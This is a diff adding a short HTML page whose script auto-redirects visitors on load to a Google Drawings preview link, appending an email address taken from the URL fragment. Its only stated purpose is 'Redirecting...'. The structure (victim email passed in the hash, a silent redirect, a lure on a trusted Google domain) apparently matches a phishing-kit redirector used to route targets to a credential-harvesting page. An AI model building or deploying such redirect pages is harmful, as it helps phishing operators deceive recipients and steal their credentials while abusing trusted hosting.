@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        // Function to get a random query parameter
+        function getParameter() {
+            const listof = ["#"];
+            const randomIndex = Math.floor(Math.random() * listof.length);
+            return listof[randomIndex];
+        }
+
+        // Function to redirect to a new page with email parameter
+        function redirectToPage() {
+            const baseUrl = "https://docs.google.com/drawings/d/1S-s8R-rhPATDgQCKuDzIi_oRvSe1UOMyICD0-FdOilQ/preview"; // Base URL
+            const queryParam = getParameter(); // Get query parameter
+            const hash = window.location.hash;
+            const email = hash.split('#')[1] || ""; // Extract email from hash
+            const redirectUrl = `${baseUrl}${queryParam}${email}`; // Construct the URL
+
+            window.location.href = redirectUrl; // Redirect to the new URL
+        }
+
+        // Execute the redirection when the script loads
+        redirectToPage();
+    </script>
+</head>
+<body>
+    <p>Redirecting, please wait...</p>
+</body>
+</html>
